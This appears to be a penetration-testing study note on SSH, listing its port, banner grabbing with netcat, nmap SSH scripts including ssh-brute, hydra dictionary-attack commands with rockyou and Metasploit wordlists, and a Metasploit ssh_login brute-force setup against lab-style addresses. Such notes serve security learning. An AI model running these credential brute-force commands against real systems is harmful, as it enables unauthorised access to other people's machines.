# Table of Contents
1. [Overview](#Overview)
	1. Ports
	3. Usage
	4. Related Services
2. [Tools](#Tools)

---
# Overview
SSH - Secure Shell

Used to connect to securely connect to remote machines.

## #Ports
- 22 : main port

## Related Services
- vFTP

## Usage
`ssh -p 22 user@192.168.4.3`

---

# #Tools
## netcat
`nc 192.168.13.3 22` 
- grabs banner

## #nmap
- --script
	- ssh2-enum-algos
		- shows key algorithms
	- ssh-hostkey 
		- --script-args ssh_hostkey=full
	- ssh-auth-methods
		- can check if user has no password set
		- --script-args="ssh.user=admin"
	- ssh-brute --script-args userdb=/userlist
		- args : userdb, passdb, timeout
		- has its own wordlist
	- ssh-run 
		- `--script-args"username=student,password="",cmd=ls"`

## #hydra
dictionary attack
`hydra -l student -P /usr/share/wordlist/rockyou.txt 192.168.7.3 ssh`

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
192.168.7.3 -t 4 ssh 
```


## #msfconsole
- use auxiliary/scanner/ssh/ssh_login
	- options
	- set rhosts 192.26.34.2
	- set userpass_file /usr/share/wordlists/metaslpoit/root_userpass.txt
	- set STOP_ON_SUCCESS true
	- set verbose true
	- run